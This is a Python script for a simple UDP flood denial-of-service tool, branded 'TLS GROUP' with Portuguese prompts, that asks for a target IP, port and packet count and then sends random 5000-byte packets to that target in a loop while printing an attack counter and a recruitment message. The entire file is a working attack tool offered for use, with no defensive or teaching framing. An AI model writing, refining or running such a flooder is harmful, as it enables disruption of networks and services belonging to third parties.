import os,time,socket,random

os.system("cls")
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(5000)
sent = 0

class dosattack():
    def __init__(self,ipaddress,port,packets):
        self.ipaddress=ipaddress
        self.port=port
        self.packets=packets

    def __str__(self):
        return " \u001b[33m__Informations__ \n\n \u001b[31;1mIp Address: \u001b[32;1m{}\n \u001b[31;1mPort: \u001b[32;1m{}\n \u001b[31;1mPacket: \u001b[32;1m{}".format(self.ipaddress,self.port,self.packets)

    def __len__(self):
        return self.packets

while True:
	try:
		print("""
         \u001b[36m______________________________________________________
                \u001b[36mTLS\u001b[31;1m GROUP \u001b[36m OWNA
                    \u001b[37mBY \u001b[36 WWOLF
        ______________________________________________________
                    """)
		time.sleep(3)
		ipp=input(" \u001b[32;1mCOLOQUE O IP DO ALVO:\u001b[35;1m ")
		pport=int(input(" \u001b[32;1mCOLOQUE A PORTA:\u001b[35;1m "))
		packetss=int(input(" \u001b[32;1mNUMERO DE PACOTES:\u001b[35;1m "))
		os.system("cls")
		break
	except ValueError:
		print("\n \u001b[31mQUERO SO O IP!!")
		time.sleep(2)
		os.system("cls")

print("""
         \u001b[36m______________________________________________________
                \u001b[36m TLS \u001b[31;1m GROUP  \u001b[36m OWNA
                \u001b[37m TA SENTINDO A ENERGIA? \u001b[36m
        ______________________________________________________
                    """)

atak1=dosattack(ipp,pport,packetss)
print(atak1)
os.system("cls")

for i in range(packetss):
    print("""
             \u001b[36m______________________________________________________
                   \u001b[36m TLS \u001b[31;1m GROUP  \u001b[36m OWNA
                \u001b[37m BY \u001b[36m WWOLF
            ______________________________________________________
                        """)
    print(atak1)
    s.sendto(packet,(ipp,pport))
    sent = sent + 1
    print("\n \u001b[33mATACANDO...>>> \u001b[31m{}".format(sent))
    os.system("cls")

print("""
         \u001b[36m______________________________________________________
                \u001b[36m TLS \u001b[31;1m GROUP  \u001b[36mS OWNA
                \u001b[37m BY \u001b[36m WOLF
        ______________________________________________________
                    """)
print(atak1)
print("\n \u001b[32mAtaque Concluido...")
print("\n \u001b[32mQUER FAZER PARTE DA TLS?? CHAME NO TWITTER (VOU CRIAR UM AINDA)...")
input()
